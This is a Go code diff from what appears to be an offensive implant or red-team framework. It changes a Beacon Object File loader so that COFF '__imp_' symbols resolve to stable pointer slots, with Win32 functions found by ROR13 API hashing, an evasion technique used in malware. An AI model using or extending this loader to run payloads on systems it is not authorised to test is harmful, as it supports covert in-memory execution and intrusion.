@@ -26,7 +26,17 @@ var (
 )
 
 // resolveBeaconImport returns the address that should be patched into the
-// BOF for the given COFF external symbol name. Three forms are recognised:
+// BOF for the given COFF external symbol name.
+//
+// Critical: COFF emits `__imp_<name>` references as `mov reg, [rip+offset]`
+// followed by `call *reg` — the BOF expects the relocation target to be
+// a memory location HOLDING the function address (the import table entry),
+// not the function address itself. This helper returns a pointer to a
+// stable per-symbol slot in importTable that holds the resolved function
+// address. The BOF then `mov reg, [importTable[name]]` reads the actual
+// function pointer at runtime.
+//
+// Three forms are recognised:
 //
 //   - "__imp_BeaconXxx"           — implemented Beacon API stub (Go callback).
 //   - "__imp_<DLL>$<Func>"        — Win32 dynamic-link import (e.g.
@@ -39,15 +49,48 @@ var (
 //                                   error rather than silently NULL-patching.
 func resolveBeaconImport(name string) (uintptr, bool) {
 	beaconCBsOnce.Do(initBeaconCallbacks)
-	if addr, ok := beaconCBs[name]; ok {
-		return addr, true
-	}
-	if dll, fn, ok := parseDollarImport(name); ok {
-		if addr, err := api.ResolveByHash(hash.ROR13Module(dll), hash.ROR13(fn)); err == nil {
-			return addr, true
+	var funcAddr uintptr
+	switch {
+	case strings.HasPrefix(name, "__imp_"):
+		if addr, ok := beaconCBs[name]; ok {
+			funcAddr = addr
+		} else if dll, fn, ok := parseDollarImport(name); ok {
+			a, err := api.ResolveByHash(hash.ROR13Module(dll), hash.ROR13(fn))
+			if err != nil {
+				return 0, false
+			}
+			funcAddr = a
+		} else {
+			return 0, false
 		}
+	default:
+		return 0, false
 	}
-	return 0, false
+	return importSlotFor(name, funcAddr), true
+}
+
+// importTable holds one *uintptr per resolved external symbol — the BOF's
+// mov reg, [rip+offset] dereferences these slots to get the function
+// address. Entries are pinned for the package lifetime; addresses are
+// stable so subsequent Execute calls reuse the same slot.
+var (
+	importMu    sync.Mutex
+	importTable = map[string]*uintptr{}
+)
+
+func importSlotFor(name string, funcAddr uintptr) uintptr {
+	importMu.Lock()
+	defer importMu.Unlock()
+	if slot, ok := importTable[name]; ok {
+		// Refresh (Beacon callbacks have stable addresses; Win32 imports
+		// could in theory move across DLL reloads — refresh to be safe).
+		*slot = funcAddr
+		return uintptr(unsafe.Pointer(slot))
+	}
+	slot := new(uintptr)
+	*slot = funcAddr
+	importTable[name] = slot
+	return uintptr(unsafe.Pointer(slot))
 }
 
 // parseDollarImport splits a CS-format dynamic-link import symbol name into
